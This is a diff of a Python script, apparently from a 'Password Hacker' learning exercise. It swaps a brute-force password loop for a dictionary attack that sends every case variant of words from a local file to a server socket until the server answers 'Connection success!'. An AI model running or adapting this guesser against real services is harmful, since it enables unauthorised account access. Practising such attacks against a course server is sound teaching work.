@@ -10,15 +10,18 @@ port = int(args[2])
 flag = False
 with socket.socket() as admin_socket:
     admin_socket.connect((ip_address, port))
-    for i in range(1, 10):
-        for x in itertools.product(symbols, repeat=i):
-            tried = "".join(x)
-            admin_socket.send(tried.encode())
-            buffer_size = 1024
-            message = admin_socket.recv(buffer_size)
-            if message.decode() == "Connection success!":
-                flag = True
-                print(tried)
+    with open(r"C:\Users\reshv\PycharmProjects\Password Hacker\Password Hacker\task\hacking\passwords.txt", mode="r") \
+            as file:
+        for line in file:
+            word = line.strip()
+            it = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word)))
+            for x in it:
+                admin_socket.send(x.encode('utf8'))
+                buffer_size = 1024
+                message = admin_socket.recv(buffer_size)
+                if message.decode('utf8') == "Connection success!":
+                    flag = True
+                    print(x)
+                    break
+            if flag:
                 break
-        if flag:
-            break
